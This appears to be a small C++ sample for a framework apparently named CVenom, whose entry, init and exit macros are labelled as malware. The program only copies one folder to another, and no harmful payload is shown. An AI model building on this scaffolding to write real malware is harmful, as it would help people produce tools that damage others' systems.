#include "../CVenom.h"
#include "../DiskTools.h"

int main(MALWARE_ENTRY){
	cvinit(MALWARE_INIT);

	DiskTools		Disk;
	Disk.FolderCopy("ayre", "zabre");

	cvexit(MALWARE_EXIT);
}
